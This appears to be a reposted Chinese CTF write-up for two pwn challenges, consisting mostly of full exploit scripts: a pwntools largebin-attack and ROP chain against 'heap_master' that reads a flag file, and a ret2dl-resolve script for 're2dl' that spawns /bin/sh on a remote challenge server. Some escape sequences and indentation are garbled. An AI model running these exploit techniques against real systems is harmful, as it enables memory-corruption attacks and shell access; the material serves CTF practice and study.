![](https://i.loli.net/2020/06/15/Odu9hL5gWcZDAaT.png)

## pwn

###  heap_master

一开始没看出来是原题，largebin attack也不会（学堆的时候偷懒跳过了QAQ）

后来谷歌一搜，找了两篇exp，拼了一下，改了改打通嘞。

<https://www.dazhuanlan.com/2020/02/11/5e425387e2d1d/>

还有一篇是天枢的，一下子找不到了

exp:

    
    
    #!/usr/bin/python
    
    from pwn import *
    #from LibcSearcher import LibcSearcher
    context(arch='amd64')
    
    local=0
    binary_name='heap_master.bak'
    libc_name='libc.so.6'
    if local:
    ###    p=process("./"+binary_name)
        p=process(['./'+binary_name],env={'LD_PRELOAD':'./'+libc_name})
        e=ELF("./"+binary_name)
    ###    libc=e.libc
        libc=ELF("./libc.so.6")
    else:
        p=remote('118.31.11.216',30078)
        e=ELF("./"+binary_name)
        libc=ELF("./libc.so.6")
    
    def z(a=''):
        if local:
            gdb.attach(p,a)
            if a=='':
                raw_input
        else:
            pass
    ru=lambda x:p.recvuntil(x)
    sl=lambda x:p.sendline(x)
    sd=lambda x:p.send(x)
    sa=lambda a,b:p.sendafter(a,b)
    sla=lambda a,b:p.sendlineafter(a,b)
    ia=lambda :p.interactive()
    def leak_address():
        if(context.arch=='i386'):
            return u32(p.recv(4))
        else :
            return u64(p.recv(6).ljust(8,'x00'))
    def cho(num):
        #sleep(0.1)
        p.recvuntil('>> ')
        p.sendline(str(num))
    def add(size):
        cho(1)
        sla("size: ",str(size))
    def free(offset):
        cho(3)
        sla("offset: ",str(offset))
    def edit(offset,content):
        cho(2)
        sla("offset: ",str(offset))
        sla("size: ",str(len(content)))
        sa("content: ",content)
    def g(off):
        return libc_base + off
    
    def pwn():
        offset = 0x8800-0x7A0
    #    stdout = 0x2620
        stdout = ((0x40|6)<<8)# + 0x20
        edit(offset+8, p64(0x331)) #p1 offset+0x10
        edit(offset+8+0x330, p64(0x31))
        edit(offset+8+0x360, p64(0x411)) #p2
        edit(offset+8+0x360+0x410, p64(0x31))
        edit(offset+8+0x360+0x440, p64(0x411)) #p3
        edit(offset+8+0x360+0x440+0x410, p64(0x31))
        edit(offset+8+0x360+0x440+0x440, p64(0x31))
    
    
        free(offset+0x10)#p1
        free(offset+0x10+0x360)#p2
        add(0x90)#p2 => largebin
    
        edit(offset+8+0x360, p64(0x101)+p64(0)+p64(0x101))#p2 size=>0x101
        edit(offset+8+0x460, p64(0x101)+p64(0)+p64(0x101))
        edit(offset+8+0x560, p64(0x101)+p64(0)+p64(0x101))
    
        free(offset+0x10+0x370)
        add(0x90)#last p1->small bin
        free(offset+0x10+0x360)
        add(0x90)
    
        edit(offset+8+0x360, p64(0x401) + p64(0) + p16(stdout-0x10)) #p2->bk
    
    #    edit(offset+8+0x360+0x18, p64(0) + p16(stdout+0x19-0x20)) #p2->bk_nextsize
        edit(offset+8+0x360+0x18, p64(0) + p16(stdout)) #p2->bk_nextsize
        free(offset+0x10+0x360+0x440) #p3
        add(0x90)
        p.recv(0x18)
    #    libc_base = u64(p.recv(8))-libc.symbols['_IO_file_jumps']
        libc_base = u64(p.recv(8))-0x39e5f0
        log.info('libc_base:'+hex(libc_base))
    #    system = libc_base + libc.symbols['system']
        system = libc_base + 0x40D50
    #    _dl_open_hook = libc_base + libc.symbols['_dl_open_hook']
        _dl_open_hook = libc_base + 0x3A22E0
        heap_p3 = u64(p.recv(8))
        heap = heap_p3 - 0x83c0
        log.info('mmap_base:'+hex(heap))
    ###############################################################################################
        offset = 0x100
    
        edit(offset+8, p64(0x331)) #p1
        edit(offset+8+0x330, p64(0x31))
            edit(offset+8+0x360, p64(0x511)) #p2
            edit(offset+8+0x360+0x510, p64(0x31))
            edit(offset+8+0x360+0x540, p64(0x511)) #p3
            edit(offset+8+0x360+0x540+0x510, p64(0x31))
            edit(offset+8+0x360+0x540+0x540, p64(0x31))
    
            free(offset+0x10) #p1
            free(offset+0x10+0x360) #p2
    
            add(0x90)
        io = libc_base + 0x39E500
            edit(offset+8+0x360, p64(0x4f1) + p64(0) + p64(io-0x10) + p64(0) + p64(io-0x20))
    
            free(offset+0x10+0x360+0x540) #p3
    
            add(0x200)
    ###        if libc_base < 0xff4113b36000:
    ###                z()
    #    edit(0,'a')
    
            # trigger on exit()
    #    z()
            pp_j = libc_base+0x10fa54 # pop rbx ; pop rbp ; jmp rcx
            p_rsp_r = libc_base+0x3870 # pop rsp ; ret
            p_rsp_r13_r = libc_base+0x1fd94 # pop rsp ; pop r13 ; ret
            p_rdi_r = libc_base+0x1feea # pop rdi ; ret
            p_rdx_rsi_r = libc_base+0xf9619 # pop rdx ; pop rsi ; ret
    
            fake_IO_strfile = p64(0) + p64(p_rsp_r) + p64(heap+8) + p64(0) + p64(0) + p64(p_rsp_r13_r)
            _IO_str_jump = p64(libc_base + 0x39A500)
    
        orw = [
                p_rdi_r, heap,
                p_rdx_rsi_r, 0, 0,      
                libc_base+libc.sym['open'],
                p_rdi_r, 3,
                p_rdx_rsi_r, 0x100, heap+0x1337,
                libc_base+0xDE720,
                p_rdi_r, 1,
                p_rdx_rsi_r, 0x100, heap+0x1337,
                libc_base+0xDE780,
            ]
        binsh = libc_base + 0x1688F7
    #    orw = [
    #        p_rdi_r,
    #        binsh,
    #        system,
    #    ]
    
        edit(0, './flagx00x00' + flat(orw))
            edit(offset+0x360+0x540, fake_IO_strfile)
            edit(offset+0x360+0x540+0xD8, _IO_str_jump)
            edit(offset+0x360+0x540+0xE0, p64(pp_j))
    
            info('b *'+hex(pp_j))
    #    z()
            p.sendlineafter('>> ', '0')
    
            p.interactive()
    
    '''
        offset = 0x1000
        edit(offset+8, p64(0x331)) #p1 offset+0x10
            edit(offset+8+0x330, p64(0x31))
            edit(offset+8+0x360, p64(0x511)) #p2
            edit(offset+8+0x360+0x510, p64(0x31))
            edit(offset+8+0x360+0x540, p64(0x521)) #p3
            edit(offset+8+0x360+0x540+0x520, p64(0x31))
            edit(offset+8+0x360+0x540+0x550, p64(0x31))
    
        free(offset+0x10)    
        free(offset+0x360+0x10)#p2
        add(0x90)#p2 -> largebin    
        edit(offset+8+0x360, p64(0x511) + p64(0) + p64(_dl_open_hook-0x10) + p64(0) + p64(_dl_open_hook-0x20))
        free(offset+0x360+0x540+0x10) #p3
        print(hex(libc_base),hex(system),hex(_dl_open_hook))
        add(0x90) #IO_list_all -> #p3_addr
        if libc_base < 0xff4113b36000:
            z()
    
        key_rbx_gad = libc_base + 0x8959E #mov rdi, [rbx+48h] ; mov rsi, r13 ; call qword ptr [rbx+40h]
        key_rax_gad = libc_base + 0x6D98A #mov rdi, rax ; call qword ptr [rax+20h]
    
        setcontext_53 = libc_base + 0x47b40 + 53
    
        p_rbx_rbp_j = libc_base + 0x000000000012d751 #pop rbx ; pop rbp ; jmp rdx
        p_rsp_r13_r = libc_base + 0x00000000000206c3 #pop rsp ; pop r13 ; ret
        p_rsp_r = libc_base + 0x0000000000003838 #pop rsp ; ret
    
        p_rdi_r = libc_base + 0x0000000000021102 #pop rdi ; ret
        p_rdx_rsi_r = libc_base + 0x00000000001150c9 #pop rdx ; pop rsi ; ret
        open_addr = libc_base + libc.symbols['open']
        read_addr = libc_base + libc.symbols['read']
        write_addr = libc_base + libc.symbols['write']
        p_rsi_r = libc_base + 0x00000000000202e8 #pop rsi ; ret
    
    
        #open_read_write_rop
        rop = './flag'.ljust(8,'x00')+p64(0)+p64(mmap_base)+p64(p_rsi_r)+p64(0)+p64(open_addr)
        rop += p64(p_rdi_r)+p64(4)+p64(p_rdx_rsi_r)+p64(0x100)+p64(mmap_base+1337)+p64(read_addr)
        rop += p64(p_rdi_r)+p64(1)+p64(p_rdx_rsi_r)+p64(0x100)+p64(mmap_base+1337)+p64(write_addr)
    
        edit(0,rop)
        edit(offset+0x360+0x540, p64(key_rax_gad))#p3
            edit(offset+0x360+0x540+0xa0, p64(mmap_base + 0x10))
        edit(offset+0x360+0x540+0xa8, p64(p_rdi_r))
            edit(offset+0x360+0x540+0x20, p64(setcontext_53))
    
        free(0x10)    
        p.interactive()
    '''
    
    while True:
        try:
            pwn()
            break
        except:
            p.close()
            p=remote('118.31.11.216',30078)
    #    p=process(['./'+binary_name],env{'LD_PRELOAD':'./'+libc_name})
    

###  re2dl

貌似是XDCTF2015的题

ctf-wiki上复制exp，直接打

exp：

    
    
    #!/usr/bin/python
    
    from roputils import *
    #from pwn import process
    from pwn import remote
    from pwn import gdb
    from pwn import context
    #r = process('./pwn')
    r = remote('118.31.11.216',36666)
    context.log_level = 'debug'
    r.recv()
    
    rop = ROP('./pwn')
    offset = 112
    bss_base = rop.section('.bss')
    buf = rop.fill(offset)
    buf += rop.call('read', 0, bss_base, 0x100)
    ## used to call dl_Resolve()
    buf += rop.dl_resolve_call(bss_base + 20, bss_base)
    r.send(buf)
    
    buf = rop.string('/bin/sh')
    buf += rop.fill(20, buf)
    ## used to make faking data, such relocation, Symbol, Str
    buf += rop.dl_resolve_data(bss_base + 20, 'system')
    buf += rop.fill(100, buf)
    r.send(buf)
    r.interactive()
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Wendell** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/208526](/post/id/208526)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __1赞

 __收藏

![](https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTLumMpWCiaNM58e438jjvWeYw3ebZtAMsn84JGFsHHA1zNgqVL2icPqe6WmFhKF5dAX0LzLvCuDTKibw/132)
Wendell

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

